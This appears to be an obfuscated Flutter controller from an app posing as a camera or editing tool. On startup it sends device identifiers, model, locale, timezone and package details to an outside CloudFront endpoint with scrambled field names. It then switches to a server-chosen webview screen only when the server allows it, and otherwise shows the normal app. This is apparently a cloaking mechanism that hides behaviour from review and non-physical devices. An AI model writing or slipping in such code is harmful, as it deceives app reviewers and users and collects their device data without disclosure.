import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class CameraInitLogic extends GetxController {

  var srhxmnlfwa = RxBool(false);
  var vzgqac = RxBool(true);
  var iregf = RxString("");
  var fnqricvt = RxBool(false);
  var xbryk = RxBool(true);
  final wjemcl = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xeabpmvd();
  }


  Future<void> xeabpmvd() async {
    fnqricvt.value = true;
    xbryk.value = true;
    vzgqac.value = false;

    wjemcl.post("https://du28a8hpri4ah.cloudfront.net/HWHvfc",data: await xiqfzkphjt()).then((value) {
      var czwxa = value.data["czwxa"] as String;
      var hsock = value.data["hsock"] as bool;
      if (hsock) {
        iregf.value = czwxa;
        fvrkg();
      } else {
        ctbvl();
      }
    }).catchError((e) {
      vzgqac.value = true;
      xbryk.value = true;
      fnqricvt.value = false;
    });
  }

  Future<Map<String, dynamic>> xiqfzkphjt() async {
    final DeviceInfoPlugin mgqybx = DeviceInfoPlugin();
    PackageInfo cepyvm_vbtaw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var zgam = Platform.localeName;
    var XrLRG = currentTimeZone;

    var ypLf = cepyvm_vbtaw.packageName;
    var WKXa = cepyvm_vbtaw.version;
    var edtxcRgA = cepyvm_vbtaw.buildNumber;

    var ocAQNWS = cepyvm_vbtaw.appName;
    var FPulSBY = "";
    var HLjfiUh  = "";
    var UIuAmn = "";
    var qwxi = "";
    var fubjm = "";
    var qlha = "";
    var xhekyf = "";
    var fjinqde = "";
    var zsuxcw = "";
    var xzlot = "";


    var zjaFwT = "";
    var TkjxrKt = false;

    if (GetPlatform.isAndroid) {
      zjaFwT = "android";
      var oxpkbtnzfy = await mgqybx.androidInfo;

      UIuAmn = oxpkbtnzfy.brand;

      FPulSBY  = oxpkbtnzfy.model;
      HLjfiUh = oxpkbtnzfy.id;

      TkjxrKt = oxpkbtnzfy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zjaFwT = "ios";
      var ebvqtd = await mgqybx.iosInfo;
      UIuAmn = ebvqtd.name;
      FPulSBY = ebvqtd.model;

      HLjfiUh = ebvqtd.identifierForVendor ?? "";
      TkjxrKt  = ebvqtd.isPhysicalDevice;
    }
    var res = {
      "UIuAmn": UIuAmn,
      "edtxcRgA": edtxcRgA,
      "WKXa": WKXa,
      "ypLf": ypLf,
      "FPulSBY": FPulSBY,
      "XrLRG": XrLRG,
      "qwxi" : qwxi,
      "HLjfiUh": HLjfiUh,
      "zgam": zgam,
      "xhekyf" : xhekyf,
      "zjaFwT": zjaFwT,
      "TkjxrKt": TkjxrKt,
      "fubjm" : fubjm,
      "qlha" : qlha,
      "fjinqde" : fjinqde,
      "ocAQNWS": ocAQNWS,
      "zsuxcw" : zsuxcw,
      "xzlot" : xzlot,

    };
    return res;
  }

  Future<void> ctbvl() async {
    Get.offNamed("/easy_splash");
  }

  Future<void> fvrkg() async {
    Get.offNamed("/easy_edit_set");
  }

}
